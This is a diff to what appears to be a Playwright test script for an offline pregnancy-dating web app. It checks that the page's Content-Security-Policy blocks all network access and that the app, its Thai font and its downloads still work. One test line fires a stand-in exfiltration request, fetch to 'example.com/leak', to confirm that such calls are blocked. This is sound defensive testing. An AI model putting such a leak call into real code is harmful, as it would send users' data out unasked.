@@ -335,6 +335,57 @@ with sync_playwright() as p:
     ctx.close()
     browser.close()
 
+# ---------------- 4. Security: served over http, CSP active, nothing leaves the page ----------------
+import functools
+import http.server
+import threading
+
+CSP_WATCH = """
+window.__csp = [];
+document.addEventListener('securitypolicyviolation', function (e) {
+  window.__csp.push(e.violatedDirective + ' ' + e.blockedURI);
+});
+"""
+class QuietHandler(http.server.SimpleHTTPRequestHandler):
+    def log_message(self, *args):
+        pass
+
+
+handler = functools.partial(QuietHandler, directory=str(ROOT))
+srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), handler)
+threading.Thread(target=srv.serve_forever, daemon=True).start()
+base = f"http://127.0.0.1:{srv.server_address[1]}/index.html"
+with sync_playwright() as p:
+    browser = p.chromium.launch()
+    ctx = browser.new_context(timezone_id="Asia/Bangkok", accept_downloads=True)
+    ctx.add_init_script(CSP_WATCH)
+    page = ctx.new_page()
+    external = []
+    page.on("request", lambda r: external.append(r.url) if not r.url.startswith(f"http://127.0.0.1:{srv.server_address[1]}/") and not r.url.startswith("blob:") and not r.url.startswith("data:") else None)
+    page.goto(base, wait_until="load")
+    csp = page.evaluate("document.querySelector('meta[http-equiv=\"Content-Security-Policy\"]').content")
+    check("CSP present and blocks network", "connect-src 'none'" in csp and "default-src 'none'" in csp, csp[:120])
+    page.evaluate("document.fonts.ready")
+    check("self-hosted font loads", page.evaluate("document.fonts.check('16px \"IBM Plex Sans Thai\"', 'กขค')"))
+    page.click("#btn-example")
+    check("app works under CSP", report(page) == "GA 7+5 Wk by U/S ≠ date at GA 7+5 wk", str(report(page)))
+    page.click("#tab-research")
+    page.set_input_files("#file", str(xin))
+    page.wait_for_function("PregWheel.research._state.src && PregWheel.research._state.src.fileName === 'anc_export.xlsx'")
+    with page.expect_download():
+        page.click("#dl-xlsx")
+    with page.expect_download():
+        page.click("#dl-csv")
+    violations = page.evaluate("window.__csp")
+    check("no CSP violations in normal use", violations == [], str(violations))
+    check("no request leaves the page", external == [], str(external))
+    page.evaluate("fetch('https://example.com/leak?x=1').catch(function () {})")
+    page.wait_for_timeout(300)
+    violations = page.evaluate("window.__csp")
+    check("sending data out is blocked", any(v.startswith("connect-src") for v in violations), str(violations))
+    browser.close()
+srv.shutdown()
+
 print(f"{passed} passed, {failed} failed")
 print(f"screenshots in {OUT}")
 sys.exit(1 if failed else 0)
